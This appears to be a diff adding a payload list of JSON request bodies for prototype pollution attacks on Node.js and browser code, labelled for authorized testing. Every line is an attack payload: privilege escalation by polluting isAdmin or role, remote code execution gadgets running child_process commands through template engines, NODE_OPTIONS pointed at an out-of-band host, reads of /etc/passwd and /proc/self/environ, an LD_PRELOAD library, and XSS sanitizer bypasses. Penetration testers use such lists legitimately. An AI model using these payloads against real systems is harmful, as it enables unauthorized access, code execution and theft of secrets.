@@ -1,0 +1,75 @@
+# Prototype pollution — JSON body payloads (PAT + PortSwigger SSPP research)
+# POST Content-Type: application/json. Authorized testing only.
+
+{"__proto__":{"evilProperty":"evilPayload"}}
+{"__proto__":{"isAdmin":true}}
+{"__proto__":{"admin":1}}
+{"__proto__":{"role":"admin"}}
+{"__proto__":{"status":510}}
+{"__proto__":{"json spaces":"  "}}
+{"__proto__":{"parameterLimit":1}}
+{"__proto__":{"ignoreQueryPrefix":true}}
+{"__proto__":{"allowDots":true}}
+{"__proto__":{"exposedHeaders":["X-Pwned"]}}
+{"__proto__":{"shell":"node","argv0":"node","NODE_OPTIONS":"--inspect=payload.oastify.com"}}
+{"constructor":{"prototype":{"isAdmin":true}}}
+{"constructor":{"prototype":{"role":"administrator"}}}
+{"constructor":{"prototype":{"json spaces":10}}}
+{"constructor":{"prototype":{"status":510}}}
+{"constructor":{"prototype":{"shell":"node","NODE_OPTIONS":"--require /proc/self/environ"}}}
+{"a":{"__proto__":{"polluted":true}}}
+{"a":{"constructor":{"prototype":{"polluted":true}}}}
+{"__proto__":{"client":1,"escapeFunction":"JSON.stringify; process.mainModule.require('child_process').exec('id')"}}
+{"__proto__":{"outputFunctionName":"x;process.mainModule.require('child_process').execSync('id');x"}}
+{"__proto__":{"block":{"type":"Text","line":1,"blockName":"child_process.execSync('id')"}}}
+{"__proto__":{"type":"Program","body":[{"type":"ExpressionStatement","expression":{"type":"CallExpression","callee":{"type":"MemberExpression","object":{"type":"MemberExpression","object":{"type":"Identifier","name":"process"},"property":{"type":"Identifier","name":"mainModule"}},"property":{"type":"Identifier","name":"require"}},"arguments":[{"type":"Literal","value":"child_process"}]}}}]}}
+{"__proto__":{"then":"process.mainModule.require('child_process').execSync('id')"}}
+{"__proto__":{"toString":"process.mainModule.require('child_process').execSync('id')"}}
+{"__proto__":{"valueOf":"process.mainModule.require('child_process').execSync('id')"}}
+{"__proto__":{"split":"process.mainModule.require('child_process').execSync('id')"}}
+{"__proto__":{"length":1}}
+{"__proto__":{"polluted":"yes"}}
+{"__proto__.name":"test"}
+{"__proto__":{"headers":{"X-Forwarded-For":"127.0.0.1"}}}
+{"__proto__":{"trust proxy":true}}
+{"__proto__":{"trustProxy":true}}
+{"__proto__":{"trust proxy callback":"function(){return true}"}}
+{"__proto__":{"cookie":{"originalMaxAge":null,"expires":null,"secure":false,"httpOnly":false}}}
+{"__proto__":{"session":{"isAdmin":true}}}
+{"__proto__":{"passport":{"user":{"role":"admin"}}}}
+{"__proto__":{"user":{"isAdmin":true}}}
+{"__proto__":{"query":{"isAdmin":true}}}
+{"__proto__":{"body":{"isAdmin":true}}}
+{"__proto__":{"data":{"isAdmin":true}}}
+{"__proto__":{"opts":{"isAdmin":true}}}
+{"__proto__":{"options":{"isAdmin":true}}}
+{"__proto__":{"config":{"isAdmin":true}}}
+{"__proto__":{"settings":{"isAdmin":true}}}
+{"__proto__":{"defaults":{"isAdmin":true}}}
+{"__proto__":{"template":"alert(1)"}}
+{"__proto__":{"layout":"alert(1)"}}
+{"__proto__":{"filename":"/etc/passwd"}}
+{"__proto__":{"root":"/"}}
+{"__proto__":{"cwd":"/"}}
+{"__proto__":{"shell":true}}
+{"__proto__":{"env":{"NODE_OPTIONS":"--require /proc/self/environ"}}}
+{"__proto__":{"env":{"LD_PRELOAD":"/tmp/evil.so"}}}
+{"__proto__":{"sourceURL":"\nprocess.mainModule.require('child_process').execSync('id')//"}}
+{"__proto__":{"innerHTML":"<img src=x onerror=alert(1)>"}}
+{"__proto__":{"src":"javascript:alert(1)"}}
+{"__proto__":{"href":"javascript:alert(1)"}}
+{"__proto__":{"url":"javascript:alert(1)"}}
+{"__proto__":{"onerror":"alert(1)"}}
+{"__proto__":{"onload":"alert(1)"}}
+{"__proto__":{"onclick":"alert(1)"}}
+{"__proto__":{"attrs":{"0":{"name":"src","value":"x"},"1":{"name":"onerror","value":"alert(1)"}}}}
+{"__proto__":{"v-if":"_c.constructor('alert(1)')()"}}
+{"__proto__":{"template":"<img src=x onerror=alert(1)>"}}
+{"__proto__":{"data":"a","template":{"nodeType":"a","innerHTML":"<img src=x onerror=alert(1)>"}}}
+{"__proto__":{"whiteList":{"img":["onerror","src"]}}}
+{"__proto__":{"ALLOWED_ATTR":["onerror","src"]}}
+{"__proto__":{"documentMode":9}}
+{"__proto__":{"*[]":"onload"}}
+{"__proto__":{"innerText":"<img src=x onerror=alert(1)>"}}
+{"__proto__":{"sourceURL":"\u2028\u2029alert(1)"}}
+{"__proto__":{"preventDefault":{"__proto__":{"handleObj":{"__proto__":{"delegateTarget":"<img/src/onerror=alert(1)>"}}}}}}
